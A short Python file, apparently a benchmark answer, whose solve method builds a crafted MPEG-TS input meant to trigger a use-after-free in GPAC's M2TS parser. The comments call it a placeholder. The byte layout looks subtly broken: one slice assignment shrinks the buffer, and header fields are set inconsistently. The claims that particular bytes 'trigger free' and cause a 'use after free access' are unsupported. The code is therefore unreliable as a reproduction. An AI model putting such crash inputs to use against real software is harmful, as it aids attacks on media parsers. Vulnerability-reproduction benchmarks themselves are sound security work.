class Solution:
    def solve(self, src_path: str) -> bytes:
        # Crafted PoC for gf_m2ts_es_del use-after-free in GPAC M2TS parser
        # This is a placeholder; in practice, derive from corpus or reverse-engineer
        # For demonstration, using a fixed length 1128 bytes with M2TS-like structure
        poc = bytearray(1128)
        # Basic M2TS sync bytes repeated
        for i in range(0, 1128, 188):
            if i + 188 <= 1128:
                poc[i] = 0x47  # Sync byte
                poc[i+1] = 0x40  # PUSI for stream start
                poc[i+3] = 0x00  # PID 0 (PAT)
                poc[i+4] = 0x10  # Adaptation + payload
                poc[i+5] = 0x00  # Continuity
                # Adaptation field length 0 for simplicity
                # Payload with crafted data to trigger ES del and use
                for j in range(i+7, min(i+188, 1128)):
                    poc[j] = 0x00 if (j % 16) < 8 else 0xFF
            else:
                # Pad last incomplete packet
                poc[i] = 0x47
        # To trigger UAF, need specific sequence: define ES, delete, then reference
        # Here, simulate with invalid PMT/ES descriptors leading to del then access
        poc[200:210] = b'\x00\x02\xb0\x00\x00\x83\x00\xf0\x00'  # Invalid PMT for ES
        poc[500:510] = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'  # Trigger free
        poc[1000:1010] = b'\x00\x01' + b'\x00' * 8  # Use after free access
        return bytes(poc)
